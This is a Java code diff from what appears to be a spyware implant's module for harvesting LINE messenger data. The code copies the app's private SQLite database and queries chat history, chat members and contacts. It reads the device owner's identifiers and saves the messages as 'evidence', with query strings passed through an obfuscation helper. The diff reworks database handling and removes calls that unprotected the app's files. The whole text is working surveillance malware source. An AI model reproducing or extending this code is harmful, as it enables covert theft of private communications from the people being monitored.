@@ -70,28 +70,37 @@ public class ChatLine extends SubModuleChat {
             if (helper == null) {
                 return;
             }
+	        List<String> mymids= new ArrayList<String>();
 
-            RecordStringVisitor visitor = new RecordStringVisitor("mid");
-            helper.traverseRecords("my_home_status", visitor);
-            List<String> mymids = visitor.getRecords();
+			try {
+				RecordStringVisitor visitor = new RecordStringVisitor("mid");
+				helper.traverseRecords("my_home_status", visitor);
 
-            Path.unprotect(dbFile, 3, true);
-            Path.unprotect(dbFile + "*", true);
+				mymids = visitor.getRecords();
+			}finally{
+				helper.disposeDb();
+			}
 
             helper = GenericSqliteHelper.openCopy(dbFile);
-            helper.deleteAtEnd = false;
+	        if (helper == null) {
+		        if (Cfg.DEBUG) {
+			        Check.log(TAG + " (ChatLine) Error, file not readable: " + dbFile);
+		        }
+		        return;
+	        }
+			try {
+				account = readMyPhoneNumber(mymids);
+				long lastmessage = readLineMessageHistory();
 
-            account = readMyPhoneNumber(mymids);
-            long lastmessage = readLineMessageHistory();
-
-            if (lastmessage > lastLine) {
-                if (Cfg.DEBUG) {
-                    Check.log(TAG + " (start) serialize: %d", lastmessage);
-                }
-                markup.serialize(lastmessage);
-            }
-
-            helper.deleteDb();
+				if (lastmessage > lastLine) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (start) serialize: %d", lastmessage);
+					}
+					markup.serialize(lastmessage);
+				}
+			}finally {
+				helper.disposeDb();
+			}
 
         } catch (Exception e) {
             if (Cfg.DEBUG) {
@@ -219,8 +228,7 @@ public class ChatLine extends SubModuleChat {
                 }
             };
 
-            helper.deleteAtEnd = true;
-            long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor, true);
+            long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);
 
             getModule().saveEvidence(messages);
             return lastmessage;
@@ -271,13 +279,13 @@ public class ChatLine extends SubModuleChat {
         };
 
         String sqlquery = M.e("SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id");
-        helper.traverseRawQuery(sqlquery, null, visitor, false);
+        helper.traverseRawQuery(sqlquery, null, visitor);
 
         sqlquery = M.e("select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id");
-        helper.traverseRawQuery(sqlquery, null, visitor, false);
+        helper.traverseRawQuery(sqlquery, null, visitor);
 
         sqlquery = M.e("select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null");
-        helper.traverseRawQuery(sqlquery, null, visitor, true);
+        helper.traverseRawQuery(sqlquery, null, visitor);
 
         groups.addLocalToAllGroups(account);
 
